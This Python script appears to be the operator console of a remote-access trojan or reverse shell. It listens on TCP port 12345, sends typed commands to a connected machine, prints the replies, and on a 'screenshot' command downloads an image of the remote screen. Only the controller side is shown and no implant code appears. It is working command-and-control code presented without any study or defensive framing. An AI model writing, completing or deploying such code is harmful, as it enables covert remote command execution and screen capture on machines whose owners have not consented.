import socket

#create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Get the hostname
hostname = socket.gethostname()

# Get the IP address
ip_address = socket.gethostbyname(hostname)

# define port and host
host = ip_address
port = 12345

# bind the socket
s.bind((host, port))

# listen
s.listen()

# Accept connection, and print connected
conn, address = s.accept()
print("Connected to : {}".format(address))

# Infinite loop
while True:
    # Ask for input
    message = input ("cmd > ")
    # Check if nothing
    if message == "":
        print ("Enter command... ")
        # Check if user ask for scrennshot
    elif message == "screenshot":
            # send the command
            conn.send(message.encode("utf-8"))
            # Open a file
            with open("screen.png", "wb") as img:
                # Receive the size of the png
                len_img = int(conn.recv(1024).decode())
                #define variable to know how much you already received
                dl_data = 0
                #while download is less than size
                while dl_data < len_img:
                    # Receive more
                    rec = conn.recv(1024)
                    # Write what you receive
                    img.write(rec)
                    # Increment dowmloaded data
                    dl_data += len(rec)
    else:
        # Send the command
        conn.send(message.encode("utf-8"))
        # Receive the responce
        data = conn.recv(1024)
        # Stop if you received "close"
        if data.decode("utf-8") == "close":
            conn.close()
            break
        # Print what you received
        print (data.decode("utf-8"))
        